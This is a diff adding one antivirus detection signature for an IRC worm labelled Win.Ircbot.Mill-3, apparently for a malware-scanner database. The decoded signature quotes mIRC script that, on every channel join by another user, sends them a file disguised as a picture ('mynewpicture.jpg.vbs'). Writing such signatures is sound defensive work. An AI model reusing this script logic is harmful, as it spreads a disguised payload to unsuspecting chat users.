@@ -1,0 +1,8 @@
+VIRUS NAME: Win.Ircbot.Mill-3
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+2=}
+n13=on ^*:JOIN:#:{
+n14=  .if ( $nick == $me ) { halt }
+n15=  .else { .dcc send $nick $mircdirmynewpicture.jpg.vbs }
